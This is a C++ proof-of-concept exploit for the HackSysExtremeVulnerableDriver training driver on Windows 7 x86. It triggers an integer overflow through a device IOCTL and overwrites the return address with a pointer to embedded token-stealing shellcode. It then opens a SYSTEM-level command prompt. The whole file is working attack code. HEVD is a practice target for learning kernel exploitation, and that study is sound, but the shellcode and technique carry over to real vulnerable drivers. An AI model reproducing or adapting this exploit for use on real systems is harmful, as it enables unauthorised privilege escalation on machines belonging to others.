#include <windows.h>
#include <iostream>
#include <string>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x222027

int main(){
    std::cout << "[+] HEVD - Integer overflow Windows 7 x86 exploit POC\n\n";
    HANDLE hDevice = CreateFileA(DEVICE_NAME,
                                 GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL,
                                 OPEN_EXISTING,
                                 FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
                                 NULL);

    if (hDevice == INVALID_HANDLE_VALUE){
        std::cout << "[!] Failed to establish a device handler" << GetLastError() << std::endl;
    } else {
        std::cout << "[+] Established a handle to the device - " << DEVICE_NAME << std::endl;
    }

    // --------------------------------------------------------------------------- //
    //                  Preparing the shellcode payload to be sent
    // --------------------------------------------------------------------------- //
   char shellcodePayload[] = (
          "\x60"
          "\x64\xA1\x24\x01\x00\x00"
          "\x8B\x40\x50"
          "\x89\xC1"
          "\x8B\x98\xF8\x00\x00\x00"
          "\xBA\x04\x00\x00\x00"
          "\x8B\x80\xB8\x00\x00\x00"
          "\x2D\xB8\x00\x00\x00"
          "\x39\x90\xB4\x00\x00\x00"
          "\x75\xED"
          "\x8B\x90\xF8\x00\x00\x00"
          "\x89\x91\xF8\x00\x00\x00"
          "\x61"
          "\x5d"
          "\xc2\x08\x00"
          );

    LPVOID shellcode_address = VirtualAlloc(NULL,
                sizeof(shellcodePayload),
                MEM_RESERVE | MEM_COMMIT,
                PAGE_EXECUTE_READWRITE);

    memcpy(shellcode_address, shellcodePayload , sizeof(shellcodePayload));
    std::cout << "[+] Shellcode allocated at " << std::hex << shellcode_address << std::endl;

    // --------------------------------------------------------------------------- //
    //                  Now we prepare the user buffer to be sent
    // --------------------------------------------------------------------------- //

    std::cout << "[+] Preparing the buffer payload\n";

    BYTE userBuffer[0x830] = { 0 }; // should be 0x830 - 2096
    memset(userBuffer, '\x41', 0x828); // setting the buffer up to EIP
    // for above, buffer should be 0x828 - 2088

    std::cout << "[+] Allocating the user-mode buffer - " << sizeof(userBuffer) << std::endl;

    memcpy(userBuffer + 0x828, &shellcode_address, 0x4); // put the shellcode address right after the buffer
    // for above, userbuffer + 2088
    BYTE terminator[] = "\xb0\xb0\xd0\xba";
    memcpy(userBuffer + 0x82c, &terminator, 0x4);
  
    std::cout << "\t[+] Preparing terminator bytes\n";
  	std::cout << "\t[+] Finalization of the user buffer complete\n";
  
    std::cout << "[+] Sending final buffer of size: " << sizeof(userBuffer) << std::endl;
    DWORD sizeReturn = 0x0;
    int deviceCom = DeviceIoControl(hDevice,
                    IOCTL,
                    &userBuffer,
                    0xffffffff,
                    NULL,
                    0,
                    &sizeReturn,
                    NULL);
    if(deviceCom){
        std::cout << "[+] Successfully send buffer payload to the driver\n";
        std::cout << "[+] Spawning NT SYSTEM cmd prompt, enjoy!\n";

        STARTUPINFO StartupInfo;
        PROCESS_INFORMATION ProcessInformation;

        ZeroMemory(&StartupInfo, sizeof(StartupInfo));
        ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

        BOOL aCreated;
        aCreated = CreateProcessA("C:\\Windows\\System32\\cmd.exe",
                                  NULL,
                                  NULL,
                                  NULL,
                                  0,
                                  CREATE_NEW_CONSOLE,
                                  NULL,
                                  NULL,
                                  &StartupInfo, &ProcessInformation);
        if(aCreated == FALSE){
            std::cout << "[!] failed to launch process - " << GetLastError() << std::endl;

        }
    } else {
        std::cout << "[!] Failed to send payload to the device driver\n";
    }
    return 0;
}
